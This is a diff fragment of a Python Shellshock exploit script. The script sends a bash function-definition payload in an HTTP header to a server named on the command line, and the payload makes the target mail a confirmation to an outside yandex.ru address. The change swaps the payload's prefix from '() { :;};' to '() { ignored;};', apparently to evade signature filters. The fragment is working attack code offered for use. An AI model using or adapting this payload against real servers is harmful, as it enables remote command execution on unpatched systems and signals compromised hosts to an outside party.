@@ -12,7 +12,7 @@ if (len(sys.argv)<3):
 	exit(0)
 
 conn = httplib.HTTPConnection(sys.argv[1])
-reverse_shell="() { :;}; bash -c 'echo \"Testest\" | mail -s \"Repix done\" -a \"From: vps2@vps2.vps2\" markhost@yandex.ru'"
+reverse_shell="() { ignored;}; bash -c 'echo \"Testest\" | mail -s \"Repix done\" -a \"From: vps2@vps2.vps2\" markhost@yandex.ru'"
 
 headers = {"Content-type": "application/x-www-form-urlencoded",
 	"test":reverse_shell }
